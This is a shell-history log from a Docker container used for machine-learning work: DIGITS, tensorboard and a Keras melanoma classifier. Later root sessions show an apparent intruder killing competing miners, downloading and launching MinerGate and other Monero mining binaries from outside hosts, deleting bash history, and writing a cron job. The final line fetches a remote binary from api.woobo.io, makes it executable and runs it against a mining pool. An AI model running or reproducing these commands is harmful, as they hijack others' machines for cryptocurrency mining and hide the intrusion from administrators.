+cd digits ### @4f5dbda04bfa /dev/pts/0 20161029 21:02 /root -> /root/digits
+pip install -r requirements.txt ### @4f5dbda04bfa /dev/pts/0 20161029 21:04 /root/digits
+pip install -r requirements.txt ### @4f5dbda04bfa /dev/pts/0 20161029 21:04 /root/digits
+sudo apt-get install graphviz ### @4f5dbda04bfa /dev/pts/0 20161029 21:04 /root/digits
+./digits-devserver ### @4f5dbda04bfa /dev/pts/0 20161029 21:05 /root/digits
+sudo apt-get install -y libprotobuf-dev libleveldb-dev   libsnappy-dev libopencv-dev libboost-all-dev libhdf5-serial-dev   libgflags-dev libgoogle-glog-dev liblmdb-dev protobuf-compiler   libatlas-base-dev libyaml-dev  ### @4f5dbda04bfa /dev/pts/0 20161029 21:06 /root/digits
+vi ~/histlog  ### @4f5dbda04bfa /dev/pts/0 20161031 08:46 /root/digits
+vim ~/histlog  ### @4f5dbda04bfa /dev/pts/0 20161031 08:47 /root/digits
+ls ### @4f5dbda04bfa /dev/pts/0 20161031 08:49 /root/digits
+cd .. ### @4f5dbda04bfa /dev/pts/0 20161031 08:49 /root/digits -> /root
+ls ### @4f5dbda04bfa /dev/pts/0 20161031 08:49 /root
+mkdir heallo ### @4f5dbda04bfa /dev/pts/0 20161031 08:49 /root
+cd heallo/ ### @4f5dbda04bfa /dev/pts/0 20161031 08:49 /root -> /root/heallo
+git clone https://github.com/iweink/HealloDoctor.git ### @4f5dbda04bfa /dev/pts/0 20161031 08:51 /root/heallo
+git clone https://github.com/iweink/HealloDoctor.git ### @4f5dbda04bfa /dev/pts/0 20161031 08:51 /root/heallo
+ls ### @4f5dbda04bfa /dev/pts/0 20161031 08:51 /root/heallo
+cd HealloDoctor/ ### @4f5dbda04bfa /dev/pts/0 20161031 08:51 /root/heallo -> /root/heallo/HealloDoctor
+ls ### @4f5dbda04bfa /dev/pts/0 20161031 08:51 /root/heallo/HealloDoctor
+npm install ### @4f5dbda04bfa /dev/pts/0 20161031 08:51 /root/heallo/HealloDoctor
+apt-get install npm ### @4f5dbda04bfa /dev/pts/0 20161031 08:51 /root/heallo/HealloDoctor
+npm install ### @4f5dbda04bfa /dev/pts/0 20161031 08:52 /root/heallo/HealloDoctor
+npm install ### @4f5dbda04bfa /dev/pts/0 20161031 08:52 /root/heallo/HealloDoctor
+less npm-debug.log ### @4f5dbda04bfa /dev/pts/0 20161031 08:52 /root/heallo/HealloDoctor
+npm install ### @4f5dbda04bfa /dev/pts/0 20161031 08:53 /root/heallo/HealloDoctor
+apt-get install node ### @4f5dbda04bfa /dev/pts/0 20161031 08:55 /root/heallo/HealloDoctor
+npm install ### @4f5dbda04bfa /dev/pts/0 20161031 08:56 /root/heallo/HealloDoctor
+apt-get install nodejs ### @4f5dbda04bfa /dev/pts/0 20161031 08:56 /root/heallo/HealloDoctor
+apt-get install -U nodejs ### @4f5dbda04bfa /dev/pts/0 20161031 08:56 /root/heallo/HealloDoctor
+apt-get install -u  nodejs ### @4f5dbda04bfa /dev/pts/0 20161031 08:57 /root/heallo/HealloDoctor
+cd / ### @4f5dbda04bfa /dev/pts/0 20161031 09:33 /root/heallo/HealloDoctor -> /
+ls ### @4f5dbda04bfa /dev/pts/0 20161031 09:33 /
+cd notebooks/ ### @4f5dbda04bfa /dev/pts/0 20161031 09:33 / -> /notebooks
+ls ### @4f5dbda04bfa /dev/pts/0 20161031 09:33 /notebooks
+cd dockermountedspaceln ### @4f5dbda04bfa /dev/pts/0 20161031 09:33 /notebooks -> /notebooks/dockermountedspaceln
+ls ### @4f5dbda04bfa /dev/pts/0 20161031 09:33 /notebooks/dockermountedspaceln
+cd isic ### @4f5dbda04bfa /dev/pts/0 20161031 09:33 /notebooks -> /notebooks/dockermountedspaceln
+cd isicOutputs/ ### @4f5dbda04bfa /dev/pts/0 20161031 09:33 /notebooks/dockermountedspaceln -> /notebooks/dockermountedspaceln/isicOutputs
+ls ### @4f5dbda04bfa /dev/pts/0 20161031 09:33 /notebooks/dockermountedspaceln/isicOutputs
+cd logs ### @4f5dbda04bfa /dev/pts/0 20161031 09:34 /notebooks/dockermountedspaceln/isicOutputs -> /notebooks/dockermountedspaceln/isicOutputs/logs
+tensorboard ### @4f5dbda04bfa /dev/pts/0 20161031 09:34 /notebooks/dockermountedspaceln/isicOutputs/logs
+tensorboard ### @4f5dbda04bfa /dev/pts/0 20161031 09:34 /notebooks/dockermountedspaceln/isicOutputs/logs
+pip uninstall protobuf ### @4f5dbda04bfa /dev/pts/0 20161031 09:36 /notebooks/dockermountedspaceln/isicOutputs/logs
+tensorboard ### @4f5dbda04bfa /dev/pts/0 20161031 09:36 /notebooks/dockermountedspaceln/isicOutputs/logs
+exit ### @4f5dbda04bfa /dev/pts/0 20161031 09:37 /notebooks/dockermountedspaceln/isicOutputs/logs
+bash ### @4f5dbda04bfa /dev/pts/0 20161031 09:37 /notebooks/dockermountedspaceln/isicOutputs/logs
+pip install protobuf ### @4f5dbda04bfa /dev/pts/0 20161031 09:37 /notebooks/dockermountedspaceln/isicOutputs/logs
+tensorboard ### @4f5dbda04bfa /dev/pts/0 20161031 09:38 /notebooks/dockermountedspaceln/isicOutputs/logs
+tensorboard --logdir=. ### @4f5dbda04bfa /dev/pts/0 20161031 09:38 /notebooks/dockermountedspaceln/isicOutputs/logs
+tensorboard --logdir=. ### @4f5dbda04bfa /dev/pts/0 20161031 11:36 /notebooks/dockermountedspaceln/isicOutputs/logs
+docker ps ### @4f5dbda04bfa not a tty 20161104 07:03 /
+exit ### @4f5dbda04bfa /dev/pts/0 20161104 10:16 /notebooks
+ls /home/ ### @4f5dbda04bfa /dev/pts/0 20161104 10:16 /notebooks
+ls /home/ ### @4f5dbda04bfa /dev/pts/0 20161104 10:16 /notebooks
+ls ~/ ### @4f5dbda04bfa /dev/pts/0 20161104 10:16 /notebooks
+vi ~/histlog  ### @4f5dbda04bfa /dev/pts/0 20161104 10:17 /notebooks
+cp ~/histlog /dockermountedspace/ ### @4f5dbda04bfa /dev/pts/0 20161104 10:17 /notebooks
+ls ### @4f5dbda04bfa /dev/pts/0 20161104 10:17 /notebooks
+cp ~/.bash_profile /dockermountedspace/ ### @4f5dbda04bfa /dev/pts/0 20161104 10:18 /notebooks
+cp ~/.bashrc /dockermountedspace/ ### @4f5dbda04bfa /dev/pts/0 20161104 10:18 /notebooks
+cp ~/.vimrc /dockermountedspace/ ### @4f5dbda04bfa /dev/pts/0 20161104 10:18 /notebooks
+exit ### @f5e57551b879 not a tty 20161216 13:28 /notebooks
+hostname ### @f5e57551b879 not a tty 20161216 13:28 /notebooks
+exit ### @f5e57551b879 not a tty 20161216 13:29 /notebooks
+ls ### @f5e57551b879 not a tty 20161216 13:29 /notebooks
+cd .. ### @f5e57551b879 not a tty 20161216 13:29 /notebooks -> /
+ls ### @f5e57551b879 not a tty 20161216 13:29 /
+ls dockermountedspace/ ### @f5e57551b879 not a tty 20161216 13:29 /
+ls dockermountedspace/ ### @f5e57551b879 not a tty 20161216 13:30 /
+ls datamnt/ ### @f5e57551b879 not a tty 20161216 13:30 /
+cd datamnt/ ### @f5e57551b879 not a tty 20161216 13:30 / -> /datamnt
+cd github/ ### @f5e57551b879 not a tty 20161216 13:30 /datamnt -> /datamnt/github
+ls ### @f5e57551b879 not a tty 20161216 13:30 /datamnt/github
+cd keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161216 13:30 /datamnt/github -> /datamnt/github/keras-cam-melanoma
+cd keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161216 13:30 /datamnt/github -> /datamnt/github/keras-cam-melanoma
+cd keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161216 13:35 /datamnt/github -> /datamnt/github/keras-cam-melanoma
+cd keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161216 13:35 /datamnt/github -> /datamnt/github/keras-cam-melanoma
+cd keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161216 13:35 /datamnt/github -> /datamnt/github/keras-cam-melanoma
+which python ### @f5e57551b879 not a tty 20161216 13:36 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../data/images12kclassifiedresized/train" --train TRAIN ### @f5e57551b879 not a tty 20161216 13:36 /datamnt/github/keras-cam-melanoma
+vi data.py  ### @f5e57551b879 not a tty 20161216 13:37 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../data/images12kclassifiedresized/train" --train TRAIN ### @f5e57551b879 not a tty 20161216 13:37 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161216 13:37 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161216 13:39 /datamnt/github/keras-cam-melanoma
+exit ### root@f5e57551b879 /dev/pts/1 20161216 13:40 /notebooks
+exit ### root@f5e57551b879 /dev/pts/1 20161216 13:40 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 13:40 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 13:40 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 13:40 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 13:40 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 13:40 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 13:40 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/1 20161216 13:41 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161216 13:41 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 13:41 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161216 13:41 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 13:41 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161216 13:41 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 13:41 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/1 20161216 13:41 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161216 13:41 /notebooks
+vi model.py ### @f5e57551b879 not a tty 20161216 13:46 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161216 13:47 /datamnt/github/keras-cam-melanoma
+mv ../../trainsmall/malignant ../../trainsmall/pos ### @f5e57551b879 not a tty 20161216 13:48 /datamnt/github/keras-cam-melanoma
+mv ../../trainsmall/benign ../../trainsmall/neg ### @f5e57551b879 not a tty 20161216 13:48 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../data/images12kclassifiedresized/train" --train TRAIN ### @f5e57551b879 not a tty 20161216 13:48 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161216 13:58 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161216 13:58 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161216 13:58 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161216 14:08 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 14:38 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 14:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 14:38 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 14:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 14:38 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 14:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 14:38 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 14:38 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20161216 14:38 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161216 14:38 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 15:38 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 15:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 15:38 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 15:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 15:39 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 15:39 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 15:39 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 15:39 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20161216 15:39 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161216 15:39 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 16:35 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 16:36 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 16:36 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 16:36 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 16:36 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 16:36 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 16:36 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 16:36 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20161216 16:36 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161216 16:36 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 17:32 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 17:32 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 17:32 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 17:32 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 17:33 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 17:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 17:33 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 17:33 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20161216 17:33 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161216 17:33 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 18:32 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 18:32 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 18:32 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 18:32 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 18:32 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 18:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 18:33 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 18:33 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20161216 18:33 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161216 18:33 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 19:31 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 19:31 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 19:31 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 19:31 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 19:31 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 19:31 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 19:32 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 19:32 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20161216 19:32 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161216 19:32 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 20:33 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 20:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 20:33 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 20:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 20:33 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 20:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 20:33 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 20:33 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20161216 20:34 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161216 20:34 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 21:31 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 21:31 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 21:31 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 21:31 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 21:31 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 21:31 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161216 21:31 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161216 21:31 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20161216 21:31 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161216 21:31 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161216 22:26 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/1 20161216 22:26 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/1 20161216 22:26 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/1 20161216 22:26 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/1 20161216 22:26 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/1 20161216 22:26 /root
+ top c  ### root@f5e57551b879 /dev/pts/1 20161216 22:26 /root
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161217 00:15 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/2 20161217 00:15 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/2 20161217 00:15 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/2 20161217 00:15 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/2 20161217 00:15 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/2 20161217 00:15 /root
+ top c  ### root@f5e57551b879 /dev/pts/2 20161217 00:15 /root
+exit ### root@f5e57551b879 /dev/pts/3 20161217 02:13 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/3 20161217 02:13 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/3 20161217 02:13 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/3 20161217 02:13 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/3 20161217 02:13 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/3 20161217 02:13 /root
+ top c  ### root@f5e57551b879 /dev/pts/3 20161217 02:14 /root
+exit ### root@f5e57551b879 /dev/pts/4 20161217 04:00 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/4 20161217 04:00 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/4 20161217 04:00 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/4 20161217 04:00 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/4 20161217 04:00 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/4 20161217 04:00 /root
+ top c  ### root@f5e57551b879 /dev/pts/4 20161217 04:01 /root
+exit ### root@f5e57551b879 /dev/pts/5 20161217 04:36 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/5 20161217 04:36 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/5 20161217 04:36 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/5 20161217 04:36 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/5 20161217 04:36 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/5 20161217 04:36 /root
+ top c  ### root@f5e57551b879 /dev/pts/5 20161217 04:36 /root
+exit ### root@f5e57551b879 /dev/pts/6 20161217 05:03 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/6 20161217 05:03 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/6 20161217 05:03 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/6 20161217 05:03 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/6 20161217 05:03 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/6 20161217 05:03 /root
+ top c  ### root@f5e57551b879 /dev/pts/6 20161217 05:03 /root
+exit ### root@f5e57551b879 /dev/pts/2 20161217 05:41 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/2 20161217 05:41 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/2 20161217 05:41 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/2 20161217 05:41 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/2 20161217 05:41 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/2 20161217 05:41 /root
+ top c  ### root@f5e57551b879 /dev/pts/2 20161217 05:42 /root
+exit ### root@f5e57551b879 /dev/pts/3 20161217 07:40 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/3 20161217 07:40 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/3 20161217 07:40 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/3 20161217 07:40 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/3 20161217 07:40 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/3 20161217 07:40 /root
+if [ -f ? ]; then ./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; else wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam || (apt-get update && apt-get -y install wget && wget http://api.woobo.io:8888/media/580d73c364ef7e252d1fd02c_0.yam); chmod +x 580d73c364ef7e252d1fd02c_0.yam && mv 580d73c364ef7e252d1fd02c_0.yam ?;./? -c x -M stratum+tcp://alekx12555%40mail.ru:x@xmr.pool.minergate.com:45560/xmr; fi  ### root@f5e57551b879 /dev/pts/1 20161217 07:45 /root
